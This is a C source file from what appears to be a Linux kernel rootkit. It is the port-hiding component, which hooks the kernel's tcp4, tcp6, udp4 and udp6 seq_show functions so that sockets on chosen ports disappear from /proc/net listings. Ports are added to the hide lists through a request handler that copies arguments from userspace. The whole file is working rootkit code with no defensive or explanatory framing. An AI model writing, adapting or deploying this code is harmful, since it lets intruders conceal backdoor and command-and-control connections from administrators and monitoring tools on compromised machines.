#include "port_hiding.h"
#include "../khook/engine.h"
#include "../protocol.h"

#include <linux/seq_file.h> // struct seq_file
#include <net/sock.h> // struct sock

struct PortNode {
    unsigned short port;
};

#define MAX_PORT_LENGTH 16

static struct PortNode tcp4_list[MAX_PORT_LENGTH];
static int tcp4_list_cursor = 0;
static struct PortNode tcp6_list[MAX_PORT_LENGTH];
static int tcp6_list_cursor = 0;
static struct PortNode udp4_list[MAX_PORT_LENGTH];
static int udp4_list_cursor = 0;
static struct PortNode udp6_list[MAX_PORT_LENGTH];
static int udp6_list_cursor = 0;

// Return 0 if success
static int hide_port(unsigned char transmission_type, unsigned short port) {
    switch (transmission_type) {
        case 0x0:
            // TCP4
            if (tcp4_list_cursor >= MAX_PORT_LENGTH) {
                return 1;
            }
            tcp4_list[tcp4_list_cursor++] = (struct PortNode){ .port = port };
            break;
        case 0x1: 
            // TCP6
            if (tcp6_list_cursor >= MAX_PORT_LENGTH) {
                return 1;
            }
            tcp6_list[tcp6_list_cursor++] = (struct PortNode){ .port = port };
            break;
        case 0x2: 
            // UDP4
            if (udp4_list_cursor >= MAX_PORT_LENGTH) {
                return 1;
            }
            udp4_list[udp4_list_cursor++] = (struct PortNode){ .port = port };
            break;
        case 0x3:
            // UDP6
            if (udp6_list_cursor >= MAX_PORT_LENGTH) {
                return 1;
            }
            udp6_list[udp6_list_cursor++] = (struct PortNode){ .port = port };
            break;
        default: return 1;
    }
    return 0;
}

int handle_port_hiding_request(void *raw_subargs) {
    struct PortHidingSubargs subargs;
    if (copy_from_user(&subargs, (void *)raw_subargs, sizeof(struct PortHidingSubargs)) != 0) {
        // copy failed
        goto err;
    }
    if (hide_port(subargs.transmission_type, subargs.port) != 0) {
        // process hide failed
        goto err;
    }
    return 0;

    err:
    return 1;
}

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (sk && sk != 0x1) {
        int i;
        for (i = 0; i < tcp4_list_cursor; i++) {
            if (sk->sk_num == tcp4_list[i].port) {
                // Is the port we need to hide
                return 0;
            }
        }
    }
    return KHOOK_ORIGIN(tcp4_seq_show, seq, v);
}

KHOOK_EXT(int, tcp6_seq_show, struct seq_file *, void *);
static int khook_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (sk && sk != 0x1) {
        int i;
        for (i = 0; i < tcp6_list_cursor; i++) {
            if (sk->sk_num == tcp6_list[i].port) {
                // Is the port we need to hide
                return 0;
            }
        }
    }
    return KHOOK_ORIGIN(tcp6_seq_show, seq, v);
}


KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
static int khook_udp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (sk && sk != 0x1) {
        int i;
        for (i = 0; i < udp4_list_cursor; i++) {
            if (sk->sk_num == udp4_list[i].port) {
                // Is the port we need to hide
                return 0;
            }
        }
    }
    return KHOOK_ORIGIN(udp4_seq_show, seq, v);
}


KHOOK_EXT(int, udp6_seq_show, struct seq_file *, void *);
static int khook_udp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (sk && sk != 0x1) {
        int i;
        for (i = 0; i < udp6_list_cursor; i++) {
            if (sk->sk_num == udp6_list[i].port) {
                // Is the port we need to hide
                return 0;
            }
        }
    }
    return KHOOK_ORIGIN(udp6_seq_show, seq, v);
}

